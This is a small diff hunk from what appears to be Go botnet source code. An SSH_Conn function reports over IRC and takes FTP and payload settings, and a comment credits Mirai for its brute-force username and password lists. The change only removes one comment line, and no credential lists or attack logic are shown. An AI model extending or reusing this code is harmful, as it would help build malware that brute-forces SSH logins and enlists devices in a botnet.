@@ -112,7 +112,6 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 
 	/*
 		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
-		You can add more if you want.
 		Add more usernames and passwords in to The array name "userList" and "passList".
 	*/
 	userList := []string{
